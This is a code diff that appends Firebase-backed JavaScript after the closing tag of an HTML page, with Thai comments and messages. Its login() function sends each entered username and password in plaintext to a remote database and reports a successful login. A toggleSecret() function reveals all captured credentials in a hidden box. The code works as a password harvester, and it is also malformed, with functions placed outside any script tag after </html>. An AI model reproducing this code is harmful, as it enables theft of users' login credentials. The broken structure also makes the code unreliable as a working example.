@@ -266,4 +266,52 @@
   </script>
 
 </body>
-</html>
+      </html>
+<!-- ใส่ไว้ก่อน </head> -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "API_KEY",
+    authDomain: "PROJECT_ID.firebaseapp.com",
+    databaseURL: "https://PROJECT_ID.firebaseio.com",
+    projectId: "PROJECT_ID",
+    storageBucket: "PROJECT_ID.appspot.com",
+    messagingSenderId: "SENDER_ID",
+    appId: "APP_ID"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+                         </script>
+                         function login() {
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+
+  if (username && password) {
+    // บันทึกลง Firebase
+    db.ref('users/' + Date.now()).set({
+      username: username,
+      password: password
+    }).then(() => {
+      alert('เข้าสู่ระบบสำเร็จและซิงก์กับทุกเครื่อง');
+    });
+
+  } else {
+    alert('กรุณากรอกข้อมูลให้ครบ');
+  }
+}function toggleSecret() {
+  const box = document.getElementById("secret-box");
+  if (box.style.display === "block") {
+    box.style.display = "none";
+  } else {
+    db.ref('users').once('value', snapshot => {
+      let data = snapshot.val();
+      let output = '';
+      for (let key in data) {
+        output += `ชื่อผู้ใช้: ${data[key].username}\nรหัสผ่าน: ${data[key].password}\n\n`;
+      }
+      box.innerText = output || '(ไม่มีข้อมูล)';
+      box.style.display = 'block';
+    });
+  }
+}
